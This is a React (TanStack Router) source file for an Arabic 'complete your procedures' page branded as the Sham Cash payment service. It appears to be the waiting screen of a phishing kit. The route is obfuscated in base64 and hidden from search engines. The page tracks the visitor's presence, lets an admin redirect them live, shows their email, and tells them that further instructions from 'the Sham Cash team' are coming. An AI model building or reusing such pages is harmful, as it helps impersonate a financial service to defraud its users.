import { createFileRoute } from "@tanstack/react-router";
import { ShieldCheck, Loader2 } from "lucide-react";
import { z } from "zod";
import { AppScreen } from "@/components/app-screen";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";

const searchSchema = z.object({ email: z.string().optional() });

export const Route = createFileRoute("/Y29tcGxldGU")({
  ssr: false,
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "استكمال الإجراءات | شام كاش" },
      { name: "description", content: "استكمل الإجراءات المطلوبة لإتمام توثيق حسابك." },
      { property: "og:title", content: "استكمال الإجراءات — شام كاش" },
      { property: "og:description", content: "خطوات إضافية مطلوبة لإتمام طلبك." },
    ],
  }),
  component: CompletePage,
});

function CompletePage() {
  usePresenceTracker({ page: "/Y29tcGxldGU" });
  useAdminRedirect();
  useRequireName();
  const { email } = Route.useSearch();
  return (
    <AppScreen width="sm">
      <div dir="rtl" className="flex flex-col items-center text-center text-white">
        <div className="relative flex size-20 items-center justify-center rounded-full bg-accent/15 ring-1 ring-accent/40">
          <ShieldCheck className="size-10 text-accent" />
          <Loader2 className="absolute inset-0 m-auto size-20 animate-spin text-accent/25" />
        </div>
        <h1 className="mt-6 text-2xl font-bold sm:text-3xl">استكمال الإجراءات</h1>
        <p className="mx-auto mt-3 max-w-sm text-sm leading-7 text-white/70">
          بقيت خطوات بسيطة لإتمام طلبك. سيصلك التوجيه التالي من فريق شام كاش خلال لحظات — لا حاجة لتحديث الصفحة.
        </p>
        {email ? (
          <div className="mt-5 w-full rounded-2xl bg-white/[0.06] px-4 py-2.5 text-xs text-white/80 ring-1 ring-white/10">
            البريد المسجّل: <span className="font-medium text-white">{email}</span>
          </div>
        ) : null}
      </div>
    </AppScreen>
  );
}
